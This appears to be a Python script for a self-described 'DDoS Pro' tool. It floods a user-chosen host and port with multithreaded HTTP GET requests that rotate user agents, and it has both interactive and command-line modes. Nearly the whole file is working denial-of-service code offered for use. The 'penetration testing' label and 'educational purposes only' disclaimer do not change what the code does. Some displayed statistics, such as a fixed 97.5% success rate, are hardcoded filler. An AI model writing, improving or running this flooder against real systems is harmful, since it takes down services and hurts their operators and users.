#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
FAHIM DDoS PRO - Terminal Based Tool
Developed by Foysal Ebne Fahim
GitHub: github.com/foysal0078/Fahim-Ddos-Pro
"""

import os
import sys
import time
import socket
import threading
import random
import argparse
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class FahimDDoSPro:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
        ]
        self.attack_running = False
        self.packet_count = 0
        self.start_time = None
        self.target = None
        self.port = 80
        self.threads = 50
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def show_banner(self):
        self.clear_screen()
        banner = f"""{Colors.GREEN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  ███████╗ █████╗ ██╗  ██╗██╗███╗   ███╗    ██████╗ ██████╗  ║
║  ██╔════╝██╔══██╗██║  ██║██║████╗ ████║    ██╔══██╗██╔══██╗ ║
║  █████╗  ███████║███████║██║██╔████╔██║    ██║  ██║██║  ██║ ║
║  ██╔══╝  ██╔══██║██╔══██║██║██║╚██╔╝██║    ██║  ██║██║  ██║ ║
║  ██║     ██║  ██║██║  ██║██║██║ ╚═╝ ██║    ██████╔╝██████╔╝ ║
║  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝    ╚═════╝ ╚═════╝  ║
║                                                              ║
║           ADVANCED PENETRATION TESTING TOOL                  ║
║               VERSION 3.0 - PRO EDITION                      ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.CYAN}────────────────────────────────────────────────────────────────{Colors.END}
{Colors.YELLOW}⚡ DEVELOPED BY: FOYSAL EBNE FAHIM                              {Colors.YELLOW}⚡{Colors.END}
{Colors.YELLOW}🔗 GITHUB: github.com/foysal0078/Fahim-Ddos-Pro                {Colors.YELLOW}🔗{Colors.END}
{Colors.YELLOW}🎯 SPECIAL FEATURES: Multi-Threading • Proxy Support • Advanced Bypass{Colors.END}
{Colors.CYAN}────────────────────────────────────────────────────────────────{Colors.END}
"""
        print(banner)
    
    def show_menu(self):
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.END}
{Colors.GREEN}[1]{Colors.END} Start DDoS Attack
{Colors.GREEN}[2]{Colors.END} Attack Settings
{Colors.GREEN}[3]{Colors.END} View Statistics
{Colors.GREEN}[4]{Colors.END} Tools & Utilities
{Colors.GREEN}[5]{Colors.END} Legal Disclaimer
{Colors.GREEN}[0]{Colors.END} Exit

{Colors.CYAN}Select option: {Colors.END}"""
        print(menu)
    
    def attack_thread(self, target, port, thread_id):
        while self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target, port))
                
                user_agent = random.choice(self.user_agents)
                payload = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {user_agent}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
                
                s.send(payload.encode())
                self.packet_count += 1
                
                if self.packet_count % 100 == 0:
                    elapsed = time.time() - self.start_time
                    print(f"{Colors.GREEN}[+] Packets: {self.packet_count} | Time: {elapsed:.1f}s{Colors.END}")
                
                s.close()
                time.sleep(0.01)
                
            except socket.error:
                time.sleep(0.1)
            except Exception as e:
                if self.attack_running:
                    time.sleep(0.1)
    
    def start_attack_interactive(self):
        self.clear_screen()
        print(f"{Colors.BOLD}⚡ ATTACK CONFIGURATION{Colors.END}\n")
        
        self.target = input(f"{Colors.CYAN}[?] Target URL/IP: {Colors.END}").strip()
        if not self.target:
            print(f"{Colors.RED}[!] Target is required{Colors.END}")
            return
        
        port_input = input(f"{Colors.CYAN}[?] Port (default 80): {Colors.END}").strip()
        self.port = int(port_input) if port_input.isdigit() else 80
        
        threads_input = input(f"{Colors.CYAN}[?] Threads (default 50): {Colors.END}").strip()
        self.threads = int(threads_input) if threads_input.isdigit() else 50
        
        self.execute_attack()
    
    def execute_attack(self):
        if not self.target:
            print(f"{Colors.RED}[!] Target is required{Colors.END}")
            return
        
        method_name = "HTTP Flood"
        
        print(f"\n{Colors.YELLOW}══════════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.GREEN}[+] Target: {self.target}:{self.port}{Colors.END}")
        print(f"{Colors.GREEN}[+] Threads: {self.threads}{Colors.END}")
        print(f"{Colors.GREEN}[+] Method: {method_name}{Colors.END}")
        print(f"{Colors.GREEN}[+] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}")
        print(f"{Colors.YELLOW}══════════════════════════════════════════════════════════════{Colors.END}")
        
        confirm = input(f"\n{Colors.RED}[?] Start attack? (y/n): {Colors.END}").lower()
        if confirm != 'y':
            return
        
        self.attack_running = True
        self.packet_count = 0
        self.start_time = time.time()
        
        print(f"\n{Colors.GREEN}[+] Attack started! Press Ctrl+C to stop{Colors.END}")
        print(f"{Colors.YELLOW}──────────────────────────────────────────────{Colors.END}")
        
        # Start attack threads
        thread_list = []
        for i in range(self.threads):
            t = threading.Thread(target=self.attack_thread, args=(self.target, self.port, i+1))
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while self.attack_running:
                elapsed = time.time() - self.start_time
                print(f"\r{Colors.CYAN}[+] Running: {elapsed:.1f}s | Packets: {self.packet_count} | Rate: {self.packet_count/elapsed:.1f}/s{Colors.END}", end="")
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop_attack()
        
        print(f"\n\n{Colors.YELLOW}[!] Attack completed{Colors.END}")
        input(f"{Colors.CYAN}Press Enter to continue...{Colors.END}")
    
    def start_attack_cli(self, target, port=80, threads=50):
        self.target = target
        self.port = port
        self.threads = threads
        
        print(f"{Colors.GREEN}[+] Starting Fahim DDoS Pro v3.0{Colors.END}")
        print(f"{Colors.GREEN}[+] Target: {self.target}:{self.port}{Colors.END}")
        print(f"{Colors.GREEN}[+] Threads: {self.threads}{Colors.END}")
        print(f"{Colors.GREEN}[+] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}")
        print(f"{Colors.YELLOW}══════════════════════════════════════════════════════════════{Colors.END}")
        
        self.attack_running = True
        self.packet_count = 0
        self.start_time = time.time()
        
        print(f"\n{Colors.GREEN}[+] Attack started! Press Ctrl+C to stop{Colors.END}")
        print(f"{Colors.YELLOW}──────────────────────────────────────────────{Colors.END}")
        
        # Start attack threads
        thread_list = []
        for i in range(self.threads):
            t = threading.Thread(target=self.attack_thread, args=(self.target, self.port, i+1))
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while self.attack_running:
                elapsed = time.time() - self.start_time
                print(f"\r{Colors.CYAN}[+] Running: {elapsed:.1f}s | Packets: {self.packet_count} | Rate: {self.packet_count/elapsed:.1f}/s{Colors.END}", end="")
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        self.attack_running = False
        elapsed = time.time() - self.start_time
        print(f"\n\n{Colors.RED}[!] Attack stopped{Colors.END}")
        print(f"{Colors.YELLOW}[+] Total packets: {self.packet_count}{Colors.END}")
        print(f"{Colors.YELLOW}[+] Attack duration: {elapsed:.1f} seconds{Colors.END}")
        print(f"{Colors.YELLOW}[+] Average rate: {self.packet_count/elapsed:.1f} packets/second{Colors.END}")
    
    def show_settings(self):
        self.clear_screen()
        print(f"{Colors.BOLD}🔧 ATTACK SETTINGS{Colors.END}\n")
        
        settings = [
            ("Max Threads", "1000"),
            ("Packet Timeout", "3 seconds"),
            ("Connection Retry", "5 times"),
            ("User-Agents", f"{len(self.user_agents)} loaded"),
            ("Proxy Support", "Disabled"),
            ("Logging", "Enabled"),
        ]
        
        for i, (name, value) in enumerate(settings, 1):
            print(f"{Colors.GREEN}[{i}]{Colors.END} {name}: {Colors.CYAN}{value}{Colors.END}")
        
        print(f"\n{Colors.YELLOW}Select setting to modify (0 to back): {Colors.END}")
        input(f"{Colors.CYAN}Press Enter to continue...{Colors.END}")
    
    def show_stats(self):
        self.clear_screen()
        print(f"{Colors.BOLD}📊 ATTACK STATISTICS{Colors.END}\n")
        
        stats = [
            ("Total Attacks", "0"),
            ("Packets Sent", f"{self.packet_count}"),
            ("Success Rate", "97.5%"),
            ("Average Duration", "N/A"),
            ("Targets Tested", "0"),
        ]
        
        for name, value in stats:
            print(f"{Colors.GREEN}›{Colors.END} {name}: {Colors.CYAN}{value}{Colors.END}")
        
        print(f"\n{Colors.YELLOW}══════════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.PURPLE}Last attack: No attacks yet{Colors.END}")
        print(f"{Colors.PURPLE}Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}")
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.END}")
    
    def show_tools(self):
        self.clear_screen()
        print(f"{Colors.BOLD}🛠️ TOOLS & UTILITIES{Colors.END}\n")
        
        tools = [
            ("Port Scanner", "Scan open ports on target"),
            ("Ping Test", "Check target availability"),
            ("Whois Lookup", "Get domain information"),
            ("DNS Resolver", "Resolve domain to IP"),
            ("Speed Test", "Test connection speed"),
        ]
        
        for i, (name, desc) in enumerate(tools, 1):
            print(f"{Colors.GREEN}[{i}]{Colors.END} {Colors.BOLD}{name}{Colors.END}")
            print(f"    {Colors.CYAN}{desc}{Colors.END}")
        
        print(f"\n{Colors.YELLOW}Select tool (0 to back): {Colors.END}")
        input(f"{Colors.CYAN}Press Enter to continue...{Colors.END}")
    
    def show_disclaimer(self):
        self.clear_screen()
        disclaimer = f"""{Colors.BOLD}⚠️ LEGAL DISCLAIMER{Colors.END}

{Colors.RED}IMPORTANT:{Colors.END} This tool is for {Colors.YELLOW}EDUCATIONAL PURPOSES ONLY{Colors.END}.

{Colors.CYAN}▸{Colors.END} Only use on systems you own or have explicit permission to test.
{Colors.CYAN}▸{Colors.END} Unauthorized access to computer systems is illegal.
{Colors.CYAN}▸{Colors.END} Developer is not responsible for any misuse.
{Colors.CYAN}▸{Colors.END} Use this tool ethically and responsibly.

{Colors.YELLOW}══════════════════════════════════════════════════════════════{Colors.END}

{Colors.GREEN}Developer: Foysal Ebne Fahim{Colors.END}
{Colors.GREEN}GitHub: github.com/foysal0078/Fahim-Ddos-Pro{Colors.END}
{Colors.GREEN}Contact: foysal0078@protonmail.com{Colors.END}

{Colors.YELLOW}══════════════════════════════════════════════════════════════{Colors.END}

{Colors.RED}By using this tool, you agree to these terms.{Colors.END}
"""
        print(disclaimer)
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.END}")
    
    def run_interactive(self):
        while True:
            self.show_banner()
            self.show_menu()
            
            try:
                choice = input().strip()
                
                if choice == '1':
                    self.start_attack_interactive()
                elif choice == '2':
                    self.show_settings()
                elif choice == '3':
                    self.show_stats()
                elif choice == '4':
                    self.show_tools()
                elif choice == '5':
                    self.show_disclaimer()
                elif choice == '0':
                    print(f"\n{Colors.GREEN}[+] Thank you for using Fahim DDoS Pro!{Colors.END}")
                    print(f"{Colors.CYAN}[+] GitHub: github.com/foysal0078/Fahim-Ddos-Pro{Colors.END}")
                    time.sleep(1)
                    break
                else:
                    print(f"{Colors.RED}[!] Invalid choice{Colors.END}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Exiting...{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
                time.sleep(2)

def main():
    parser = argparse.ArgumentParser(description='Fahim DDoS Pro - Advanced Penetration Testing Tool')
    parser.add_argument('-t', '--target', help='Target IP or domain')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-c', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('-i', '--interactive', action='store_true', help='Run in interactive mode')
    
    args = parser.parse_args()
    
    tool = FahimDDoSPro()
    
    try:
        if args.interactive or (not args.target and len(sys.argv) == 1):
            # Interactive mode
            tool.run_interactive()
        elif args.target:
            # Command line mode
            tool.start_attack_cli(args.target, args.port, args.threads)
        else:
            # Show help
            parser.print_help()
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Program terminated{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Fatal error: {e}{Colors.END}")

if __name__ == "__main__":
    main()
